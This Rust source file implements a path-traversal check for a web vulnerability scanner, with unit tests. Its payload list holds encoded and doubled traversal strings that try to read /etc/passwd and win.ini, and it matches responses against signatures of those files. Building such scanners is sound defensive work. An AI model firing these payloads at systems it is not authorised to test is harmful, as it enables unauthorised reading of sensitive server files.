//! Path traversal active scan check.
//!
//! Substitutes classic directory-traversal payloads into each path segment
//! of the target URL (one segment at a time) and into each query parameter,
//! then scans the response body for OS file-disclosure signatures
//! (`/etc/passwd`, `win.ini`). Any match is treated as `Critical` — a
//! successfully read sensitive file is about as unambiguous as findings get.

use async_trait::async_trait;
use reqwest::{Client, Url};

use crate::logger;
use crate::scanner::{ScanCheck, ScanFinding, ScanTarget, Severity};

/// Payloads tried against each path segment / query parameter, in order.
const PAYLOADS: &[&str] = &[
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
];

/// Response-body substrings indicating a sensitive file was disclosed.
pub const SUCCESS_SIGNATURES: &[&str] = &[
    "root:x:",
    "[extensions]",
    "boot loader",
    "for 16-bit app support",
];

pub struct TraversalCheck;

impl TraversalCheck {
    pub fn new() -> Self {
        Self
    }

    /// Scan `body` for any configured success signature. Returns the first
    /// matching signature together with up to 200 chars of context starting
    /// at the match, if found.
    fn find_success_signature(body: &str) -> Option<(&'static str, String)> {
        for sig in SUCCESS_SIGNATURES {
            if let Some(idx) = body.find(sig) {
                let evidence: String = body[idx..].chars().take(200).collect();
                return Some((sig, evidence));
            }
        }
        None
    }

    /// Send `target`'s request as-is (with `url` and `params` possibly
    /// overridden for this probe) and return the response body as text.
    /// Network/parse failures yield `None` so the caller can simply skip
    /// this probe rather than propagate an error.
    async fn probe(
        client: &Client,
        target: &ScanTarget,
        url: &str,
        params: &[(String, String)],
    ) -> Option<(String, String)> {
        let method = target.method.to_uppercase();
        let mut req = client.request(
            method.parse().unwrap_or(reqwest::Method::GET),
            url,
        );

        for (k, v) in &target.headers {
            req = req.header(k.as_str(), v.as_str());
        }

        // GET/HEAD/DELETE-style requests carry params on the query string;
        // everything else goes as a urlencoded form body, mirroring
        // sqli.rs/xss.rs.
        if !params.is_empty() {
            req = if method == "GET" || method == "HEAD" {
                req.query(params)
            } else {
                req.form(params)
            };
        }

        let request_raw = format!("{} {}", method, url);

        match req.send().await {
            Ok(resp) => match resp.text().await {
                Ok(body) => Some((request_raw, body)),
                Err(e) => {
                    logger::debug(&format!(
                        "traversal check: failed to read response body: {e}"
                    ));
                    None
                }
            },
            Err(e) => {
                logger::debug(&format!("traversal check: request failed: {e}"));
                None
            }
        }
    }

    /// Build one URL per path segment, with that segment replaced by
    /// `payload` (all other segments left untouched). Returns `(segment_idx,
    /// url)` pairs. Skipped entirely if the target's URL doesn't parse or
    /// has no path segments worth substituting.
    fn build_path_variants(base_url: &str, payload: &str) -> Vec<(usize, String)> {
        let Ok(parsed) = Url::parse(base_url) else {
            return Vec::new();
        };

        let segments: Vec<String> = match parsed.path_segments() {
            Some(s) => s.map(|s| s.to_string()).collect(),
            None => return Vec::new(),
        };

        let mut variants = Vec::with_capacity(segments.len());

        for (idx, _) in segments.iter().enumerate() {
            let mut new_segments = segments.clone();
            new_segments[idx] = payload.to_string();

            let mut variant = parsed.clone();
            {
                let mut path_mut = match variant.path_segments_mut() {
                    Ok(p) => p,
                    Err(_) => continue, // cannot-be-a-base URL; skip
                };
                path_mut.clear();
                for seg in &new_segments {
                    path_mut.push(seg);
                }
            }

            variants.push((idx, variant.to_string()));
        }

        variants
    }
}

impl Default for TraversalCheck {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl ScanCheck for TraversalCheck {
    fn name(&self) -> &str {
        "Path Traversal"
    }

    async fn check(&self, client: &Client, target: &ScanTarget) -> Vec<ScanFinding> {
        let mut findings = Vec::new();

        for payload in PAYLOADS {
            // ── Path-segment substitution ────────────────────────────────
            for (seg_idx, variant_url) in Self::build_path_variants(&target.url, payload) {
                let Some((request_raw, body)) =
                    Self::probe(client, target, &variant_url, &target.params).await
                else {
                    continue;
                };

                if let Some((sig, evidence)) = Self::find_success_signature(&body) {
                    logger::warn(&format!(
                        "traversal check: possible path traversal in path segment {} (payload `{}`) — matched signature '{}'",
                        seg_idx, payload, sig
                    ));

                    findings.push(ScanFinding {
                        check_name: self.name().to_string(),
                        severity: Severity::Critical,
                        evidence,
                        request_raw,
                        response_snippet: body.chars().take(200).collect(),
                        url: target.url.clone(),
                        parameter: Some(format!("path_segment[{}]", seg_idx)),
                    });
                }
            }

            // ── Query-parameter substitution ─────────────────────────────
            for (param_name, _) in &target.params {
                let substituted_params: Vec<(String, String)> = target
                    .params
                    .iter()
                    .map(|(k, v)| {
                        if k == param_name {
                            (k.clone(), payload.to_string())
                        } else {
                            (k.clone(), v.clone())
                        }
                    })
                    .collect();

                let Some((request_raw, body)) =
                    Self::probe(client, target, &target.url, &substituted_params).await
                else {
                    continue;
                };

                if let Some((sig, evidence)) = Self::find_success_signature(&body) {
                    logger::warn(&format!(
                        "traversal check: possible path traversal on param '{}' (payload `{}`) — matched signature '{}'",
                        param_name, payload, sig
                    ));

                    findings.push(ScanFinding {
                        check_name: self.name().to_string(),
                        severity: Severity::Critical,
                        evidence,
                        request_raw,
                        response_snippet: body.chars().take(200).collect(),
                        url: target.url.clone(),
                        parameter: Some(param_name.clone()),
                    });
                }
            }
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_unix_signature() {
        let body = "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin";
        let (sig, evidence) = TraversalCheck::find_success_signature(body).unwrap();
        assert_eq!(sig, "root:x:");
        assert!(evidence.starts_with("root:x:"));
    }

    #[test]
    fn finds_windows_signature() {
        let body = "; for 16-bit app support\n[386Enh]\n[extensions]\n";
        let (sig, _) = TraversalCheck::find_success_signature(body).unwrap();
        // First match in priority order wins — "[extensions]" appears after
        // "for 16-bit app support" in this body, but signature order in the
        // const array is checked first-to-last, and "[extensions]" comes
        // before "boot loader" / "for 16-bit app support" in that array.
        assert_eq!(sig, "[extensions]");
    }

    #[test]
    fn no_signature_returns_none() {
        let body = "Everything is fine, nothing to see here.";
        assert!(TraversalCheck::find_success_signature(body).is_none());
    }

    #[test]
    fn evidence_capped_at_200_chars() {
        let tail = "x".repeat(500);
        let body = format!("root:x:{}", tail);
        let (_, evidence) = TraversalCheck::find_success_signature(&body).unwrap();
        assert_eq!(evidence.chars().count(), 200);
    }

    #[test]
    fn build_path_variants_substitutes_each_segment() {
        let url = "https://example.com/api/v1/users";
        let variants = TraversalCheck::build_path_variants(url, "PAYLOAD");
        assert_eq!(variants.len(), 3);
        assert!(variants[0].1.contains("/PAYLOAD/v1/users"));
        assert!(variants[1].1.contains("/api/PAYLOAD/users"));
        assert!(variants[2].1.contains("/api/v1/PAYLOAD"));
    }

    #[test]
    fn build_path_variants_handles_root_path() {
        let url = "https://example.com/";
        let variants = TraversalCheck::build_path_variants(url, "PAYLOAD");
        // A single empty segment for "/" — substituting it still produces
        // one variant rather than panicking.
        assert_eq!(variants.len(), 1);
    }

    #[test]
    fn build_path_variants_invalid_url_returns_empty() {
        let variants = TraversalCheck::build_path_variants("not a url", "PAYLOAD");
        assert!(variants.is_empty());
    }
}